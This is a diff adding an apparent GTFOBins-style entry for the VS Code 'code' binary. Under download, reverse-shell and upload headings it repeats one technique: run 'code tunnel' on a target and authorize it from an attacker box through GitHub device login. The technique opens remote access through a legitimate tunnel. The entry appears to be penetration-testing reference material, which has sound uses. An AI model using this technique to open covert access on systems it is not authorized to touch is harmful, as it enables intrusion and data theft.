@@ -1,0 +1,47 @@
+code
+====
+
+Download
+--------
+
+[Sudo]
+    code tunnel --name xxxxxx
+    This requires a valid GitHub account.
+
+Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
+
+[Unprivileged]
+    code tunnel --name xxxxxx
+    This requires a valid GitHub account.
+
+Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
+
+Reverse shell
+-------------
+
+[Sudo]
+    code tunnel --name xxxxxx
+    This requires a valid GitHub account.
+
+Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
+
+[Unprivileged]
+    code tunnel --name xxxxxx
+    This requires a valid GitHub account.
+
+Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
+
+Upload
+------
+
+[Sudo]
+    code tunnel --name xxxxxx
+    This requires a valid GitHub account.
+
+Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
+
+[Unprivileged]
+    code tunnel --name xxxxxx
+    This requires a valid GitHub account.
+
+Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
